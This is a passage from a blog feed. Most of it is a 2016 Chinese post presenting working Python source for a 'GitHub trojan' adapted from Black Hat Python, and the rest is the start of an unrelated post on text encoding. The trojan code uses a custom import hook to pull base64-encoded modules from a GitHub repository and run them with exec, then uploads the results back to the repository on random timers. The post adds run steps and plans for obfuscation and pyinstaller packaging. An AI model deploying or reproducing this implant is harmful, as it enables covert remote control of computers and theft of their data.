&lt;span class="n"&gt;trojan_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;trojan_config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;.json&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;trojan_id&lt;/span&gt;
&lt;span class="n"&gt;data_path&lt;/span&gt;     &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;data/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;/&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;trojan_id&lt;/span&gt;
&lt;span class="n"&gt;trojan_modules&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;

&lt;span class="n"&gt;task_queue&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Queue&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;configured&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;


&lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./local.yaml&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;yaml&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;load&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;GitImporter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;


    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;find_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;fullname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;configured&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[*] Attempting to retrieve &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;fullname&lt;/span&gt;
            &lt;span class="n"&gt;new_library&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;modules/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;fullname&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;new_library&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new_library&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;


        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;load_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="n"&gt;module&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;imp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new_module&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="k"&gt;exec&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current_module_code&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__dict__&lt;/span&gt;

        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;module&lt;/span&gt;



&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;gh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;login&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;repo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;repository&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;blackhatpythonbook&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;master&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filepath&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;tree&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;branch&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recurse&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tree&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;[*] Found file &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;filepath&lt;/span&gt;

            &lt;span class="n"&gt;blob&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;blob&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;filename&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_json_data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sha&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;blob&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_trojan_config&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="n"&gt;configured&lt;/span&gt;

    &lt;span class="n"&gt;config_json&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_file_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trojan_config&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;config&lt;/span&gt;        &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;json&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loads&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;config_json&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="n"&gt;configured&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

            &lt;span class="k"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;import &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;store_module_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;gh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;branch&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;connect_to_github&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="n"&gt;remote_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;data/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s2"&gt;.data&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;trojan_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;100000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="n"&gt;repo&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_file&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;remote_path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Commit message&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;b64encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;module_runner&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;put&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;module&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="c1"&gt;# store the result in our repo&lt;/span&gt;
    &lt;span class="n"&gt;store_module_result&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt;


&lt;span class="c1"&gt;# main trojan loop&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;meta_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;GitImporter&lt;/span&gt;&lt;span class="p"&gt;()]&lt;/span&gt;

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;task_queue&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;empty&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;

        &lt;span class="n"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_trojan_config&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;task&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;threading&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Thread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;module_runner&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;task&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;module&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],))&lt;/span&gt;
            &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

    &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;10000&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;相关模块说明&lt;/h3&gt;
&lt;h5&gt;&lt;a href="https://github.com/sigmavirus24/github3.py"&gt;github3.py&lt;/a&gt;&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Python library for interfacing with the GitHub APIv3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5&gt;&lt;a href="https://docs.python.org/2/library/imp.html"&gt;imp&lt;/a&gt;&lt;/h5&gt;
&lt;blockquote&gt;
&lt;p&gt;Access the import internals&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;运行&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#fork https://github.com/wwj718/blackhatpythonbook&lt;/span&gt;
git clone https://github.com/USERNAME/blackhatpythonbook
&lt;span class="nb"&gt;cd&lt;/span&gt; blackhatpythonbook
mv local.yaml.template local.yaml
&lt;span class="c1"&gt;#填入你的github的用户名和密码&lt;/span&gt;
pip install github3.py
python git_trojan.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后你的本机数据将每隔一段时间上传到data/abc目录中，值得注意的是，数据经过base64编码&lt;/p&gt;
&lt;p&gt;你也可以在modules目录下新建功能脚本，脚本将被定期拉到client执行，这样一来你可以以插件的形式来添加task&lt;/p&gt;
&lt;h1&gt;想象空间&lt;/h1&gt;
&lt;p&gt;我们发现一个有趣的现象，那些叫做软件的代码，通常拥有充足的资源和权限，用户尽力满足配合软件的种种需求，饶是如此，它们还常常莫名其妙地奔溃，而另一类被称作病毒的代码，时刻被限制和提防，饶是如此，它们依然能在各种复杂的环境下健壮地运行。&lt;/p&gt;
&lt;p&gt;在某种意义上，计算机科学由黑客（hacker）驱动着&lt;/p&gt;
&lt;p&gt;我们实际上可以将以上代码看做一种热更新机制，我们可以用它来升级已分发的程序，不需要重启就能升级软件，看上去如同生物一般生长&lt;/p&gt;
&lt;h1&gt;github Webhooks &amp;amp; services&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Webhooks allow external services to be notified when certain events happen within your repository. When the specified events happen, we’ll send a POST request to each of the URLs you provide&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用github提供的webhook功能，我们可以进行时间通知&lt;/p&gt;
&lt;h3&gt;热加载&lt;/h3&gt;
&lt;p&gt;热加载是我前段时间感兴趣的一个话题，最初源于和@xudong的讨论，有空再写这部分 &lt;/p&gt;
&lt;h1&gt;建议&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;用小号测试&lt;/li&gt;
&lt;li&gt;不要做坏事哦&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;接下来干啥&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;代码混淆&lt;/li&gt;
&lt;li&gt;分发pyc&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;坑&lt;/h1&gt;
&lt;h3&gt;pyinstaller&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;pyinstaller --onefile git_trojan.py 能能通过&lt;/li&gt;
&lt;li&gt;pyinstaller 编译python2脚本时Queue会找不到， 使用2to3转为python3编译，会进进下一个问题&lt;/li&gt;
&lt;li&gt;github3.py引用的requests会报错，编码问题（python2和3都存在）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;编码问题&lt;/h3&gt;
&lt;p&gt;2to3 -w git_trojan.py,之后用python3执行，报错：&lt;code&gt;LookupError: unknown encoding: idna&lt;/code&gt;&lt;/p&gt;
&lt;h1&gt;资源&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/wwj718/blackhatpythonbook"&gt;blackhatpythonbook&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 13 Jul 2016 00:00:00 +0000</pubDate><guid>tag:,2016-07-13:use-python-and-github-create-Trojan-Horse.html</guid><category>dev-tools</category></item><item><title>编码相关的笔记</title><link>/decode-and-encode-note.html</link><description>&lt;p&gt;编码/解码问题是个大坑，其中的复杂性，大多来自历史包袱&lt;/p&gt;
&lt;p&gt;由于计算机领域的分层架构和多平台问题，这个问题被进一步加剧，unicode的出现，给这个问题带来了曙光.&lt;/p&gt;
&lt;p&gt;可是生活不总是那么美好的，有些时候，一不小心，我们还是会掉到满是泥沼的坑里&lt;/p&gt;
&lt;p&gt;周末在凤凰书城看一本数据清洗相关的书，其中说道噪声数据的问题，有问题的编码是噪声的来源之一，书中分享了不少好用的方法，在便签里记了一些，加上之前笔记里的，正好整理成一篇文章&lt;/p&gt;
&lt;h1&gt;编码问题&lt;/h1&gt;
&lt;p&gt;这里引《中文编码杂谈》中关于乱码的讨论&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在Linux平台上如果使用cat等命令查看文件中的中文内容时，可能出现乱码。这也是编码的问题。简单的说是文件时按照A编码保存，但是cat命令按照当前Locale设定的B编码去查看，在B和A不兼容的时候就出现了乱码。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;核心概念&lt;/h1&gt;
&lt;p&gt;引&lt;a href="http://cenalulu.github.io/linux/character-encoding/"&gt;十分钟搞清字符集和字符编码&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;字符集&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;简单的说字符集就规定了某个文字对应的二进制数字存放方式（编码）和某串二进制数值代表了哪个文字（解码）的&lt;code&gt;转换关系&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;字符编码&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;字符编码（英语：Character encoding）、字集码是把字符集中的字符编码为指定集合中某一对象（例如：比特模式、自然数序列、8位组或者电脉冲），以便文本在计算机中存储和通过通信网络的传递。常见的例子包括将拉丁字母表编码成摩斯电码和ASCII。其中，ASCII将字母、数字和其它符号编号，并用7比特的二进制来表示这个整数  --wikipedia&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Unicode和UTF-8&lt;/h1&gt;
